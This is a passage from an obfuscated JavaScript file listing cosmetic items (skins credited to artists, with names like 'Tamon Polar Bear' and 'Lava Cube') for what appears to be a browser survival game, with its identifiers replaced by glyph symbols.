					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠΔᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔⲆᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⵠΔⲆⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⲆⵠⵠᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Bat Limax"
				}, {
					id: 72,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔΔⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⲆⵠⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⲆⵠΔⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆΔΔΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mr. Crate"
				}, {
					id: 73,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⵠⵠΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃⲆᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⲆΔⵠΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⵠⵠⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Taco4Life & eogito",
					name: "Mr. Spider"
				}, {
					id: 93,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⵠᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⲆⲆⲆⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆⲆⲆᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠΔΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[293],
					name: "Mr. Spider 2"
				}, {
					id: 82,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃΔⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃΔΔⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⲆᐃΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⵠⵠᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Blue Starfish"
				}, {
					id: 83,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠΔⲆⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⲆⵠⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠᐃΔⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠᐃⲆΔᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Orange Starfish"
				}, {
					id: 84,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⵠᐃⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃⵠΔⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆΔⲆⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⲆΔᐃΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Pink Starfish"
				}, {
					id: 85,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃⲆⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃΔᐃⵠΔᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠΔⵠᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆⵠΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. ShellMauve"
				}, {
					id: 86,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠᐃΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔΔΔΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃᐃΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃΔⵠⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Shell Bead"
				}, {
					id: 96,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃΔⵠᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⲆⲆΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠⵠⲆᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠⵠᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "Fukss",
					name: "Angry Crab"
				}, {
					id: 98,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆⲆΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⲆΔⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠᐃⲆᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⵠⵠⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Penguin"
				}, {
					id: 126,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠΔΔⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃΔΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆⲆⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃᐃᐃΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[293],
					name: "Mr. Boar"
				}, {
					id: 145,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠⵠⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠΔᐃΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃΔΔⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⲆΔⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "I saw you"
				}, {
					id: 146,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠΔⲆⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠΔⵠⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⲆⵠᐃⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠⲆΔΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "It was funny"
				}, {
					id: 147,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆᐃⵠⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆᐃⵠⵠⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⵠⵠΔᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃᐃⵠⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "You can scream"
				}, {
					id: 158,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔⵠΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⵠΔⲆⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔΔⵠⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔᐃᐃᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Mr. Book"
				}, {
					id: 163,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⲆᐃⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠᐃΔⵠⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⲆᐃⲆᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔΔⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[293],
					name: "Mr. Mammoth"
				}, {
					id: 164,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⵠⲆΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⵠⲆⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃΔΔᐃⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆᐃⵠⲆⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": "SoOw",
					name: "Mr. Mammoth 2"
				}, {
					id: 161,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔᐃΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔΔᐃᐃᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⵠᐃΔᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃⲆⵠᐃΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Nightmare"
				}, {
					id: 168,
					"ᐃΔⲆ": ⲆΔ.ⲆΔⲆΔᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃΔᐃᐃⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⲆᐃⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃΔᐃᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Shiny Crystal"
				}, {
					id: 173,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔⵠⲆⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠΔΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⵠΔⲆΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆΔⵠΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Water skin"
				}, {
					id: 175,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⲆᐃⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⵠⲆⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃⵠⲆᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⲆᐃΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Fall Berry Bush Starver"
				}, {
					id: 176,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆᐃⲆᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠΔⵠᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔΔᐃⲆΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃⵠⵠΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Christmas Berry Bush Starver"
				}, {
					id: 177,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⲆΔⲆᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠⲆⲆⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⵠᐃⲆΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔᐃᐃⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Berry Bush Starver"
				}, {
					id: 182,
					"ᐃΔⲆ": ⲆΔ.ΔΔⵠᐃⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃᐃᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆᐃⵠᐃⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃⲆᐃⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamer"
				}, {
					id: 185,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⲆᐃᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃᐃΔᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆΔⲆⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⵠᐃⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Wolf"
				}, {
					id: 186,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔⲆⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠΔΔⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃΔⵠΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠᐃⵠᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Snow Wolf"
				}, {
					id: 187,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠᐃⵠΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠⲆᐃⲆΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠⵠΔⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔᐃᐃΔⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Rabbit"
				}, {
					id: 188,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⲆⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆΔⵠⲆΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⵠᐃΔΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠΔΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Snow Rabbit"
				}, {
					id: 189,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃⵠⵠᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔᐃΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆᐃⲆⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔΔⲆΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Bear"
				}, {
					id: 190,
					"ᐃΔⲆ": ⲆΔ.ΔΔΔᐃⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃᐃⲆᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⵠⵠⵠᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔΔⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Polar Bear"
				}, {
					id: 196,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔⵠᐃᐃΔ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆⵠⵠᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⵠⵠⵠⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔⲆⲆΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Crying Angel"
				}, {
					id: 202,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠΔⵠᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠᐃᐃⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⵠⲆᐃⵠΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⲆᐃⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Tamon Fennec"
				}, {
					id: 207,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⲆᐃΔΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠΔⵠⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠΔⲆⲆᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔⲆᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Decay"
				}, {
					id: 212,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠᐃⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⵠⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃⲆΔᐃⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔᐃᐃⲆⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Pillow"
				}, {
					id: 218,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃΔⲆⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃⵠᐃᐃΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔΔΔΔⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⲆᐃᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Exotic"
				}, {
					id: 224,
					"ᐃΔⲆ": ⲆΔ.Ⲇᐃⵠⵠⵠⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⲆⵠⲆᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⵠⵠΔⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆⲆΔⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Apple"
				}, {
					id: 225,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⲆⲆⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠΔⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃⵠΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃΔⵠᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Golden Apple"
				}, {
					id: 233,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃᐃΔΔⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔⵠᐃⲆΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃΔⵠⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆΔⵠⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lava Cube"
				}, {
					id: 234,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆᐃᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ΔⲆΔᐃⵠΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠΔⲆᐃⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆᐃᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆᐃΔ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Dragon Cube"
				}, {
					id: 42,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⵠΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠΔⲆΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆΔΔⵠᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠΔⵠΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Will-O'-The-Wisp"
				}, {
					id: 91,
					"ᐃΔⲆ": ⲆΔ.Δⵠᐃᐃⵠᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠᐃΔΔᐃᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠⵠᐃⵠⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃΔⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": "ExpertyAnimations",
					name: "Flame"
				}, {
					id: 26,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔᐃΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠⵠᐃⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆᐃᐃⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆᐃⲆΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Be a Tree"
				}, {
					id: 38,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔⵠⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⲆⵠⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⲆⵠⵠⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔᐃⲆᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Toxic Mutant"
				}, {
					id: 50,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆᐃⲆΔᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃⲆⲆᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔᐃⲆΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃᐃΔⲆᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[19],
					name: "Mr. Tomato"
				}, {
					id: 54,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆⵠΔⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⵠⲆⲆⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆᐃⲆᐃⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔᐃⲆΔΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Mauve, the Lapa"
				}, {
					id: 57,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⲆΔⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ΔΔⲆΔΔⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃⲆⵠΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠⵠᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Golden Fish"
				}, {
					id: 64,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔᐃΔᐃΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⵠᐃⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃᐃᐃΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠⲆΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "LapaMauve"
				}, {
					id: 65,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃⵠⵠᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⵠⲆⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃⲆⵠⲆᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⲆⲆⵠⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "LapaMauve "
				}, {
					id: 92,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠΔΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔΔΔᐃⲆⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠᐃⵠⲆᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆᐃⲆⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Burger"
				}, {
					id: 66,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠᐃΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃⲆⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆΔΔᐃⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃΔⵠᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Tropical Starver"
				}, {
					id: 80,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⵠⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⵠΔΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⲆᐃⲆΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆΔⵠᐃᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. ShellPink"
				}, {
					id: 81,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃΔᐃⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃᐃΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃΔΔᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆⲆΔⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. OranShell"
				}, {
					id: 99,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆΔΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⵠⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⵠᐃⵠΔΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠᐃΔΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": ⵠ[445],
					name: "Pepe"
				}, {
					id: ᐃᐃⲆⲆⲆⲆⲆ,
					"ᐃΔⲆ": ⲆΔ.ᐃΔΔΔⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃΔⵠᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆⲆΔⲆⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆᐃΔⵠΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
					"ᐃΔⵠ": "fatant",
					name: "Mr. Ant"
				}, {
					id: 115,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⵠᐃΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠᐃᐃΔⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃΔΔᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃΔᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⲆⵠΔⲆ,
